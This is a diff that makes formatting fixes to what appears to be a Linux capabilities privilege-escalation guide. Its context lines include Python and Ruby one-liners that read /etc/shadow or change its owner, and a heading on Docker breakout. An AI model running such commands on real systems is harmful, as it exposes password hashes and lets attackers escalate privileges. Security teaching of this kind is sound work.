@@ -744,7 +744,7 @@ And in order to read a file you could do:
 print(open("/etc/shadow", "r").read())
 ```
 
-#### Example with _\*\*_Environment \(Docker breakout\)
+#### Example with \_\*\*\_Environment \(Docker breakout\)
 
 You can check the enabled capabilities inside the docker container using:
 
@@ -1124,6 +1124,7 @@ python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
 
 Or with the **`ruby`** binary having this capability:
+
 ```bash
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
